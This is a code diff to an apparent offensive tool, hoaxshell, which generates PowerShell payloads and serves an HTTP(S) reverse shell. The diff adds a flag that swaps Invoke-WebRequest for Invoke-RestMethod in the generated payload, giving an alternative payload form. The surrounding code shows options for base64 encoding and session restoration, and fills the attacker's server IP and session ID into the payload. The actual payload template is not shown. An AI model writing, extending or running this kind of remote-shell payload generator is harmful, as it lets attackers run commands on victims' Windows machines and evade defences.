@@ -57,6 +57,7 @@ parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl
 parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate. ")
 parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell server port (default: 8080 over http, 443 over https)", type = int)
 parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s)", type = float)
+parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility")
 parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded")
 parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (Default: false)")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo")
@@ -456,6 +457,10 @@ def main():
 			payload = source.read().strip()
 			source.close()
 			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(frequency)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res).replace('*HOAXID*', Hoaxshell.header_id)
+			
+			if args.invoke_restmethod:
+				payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		
+			
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
 			print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
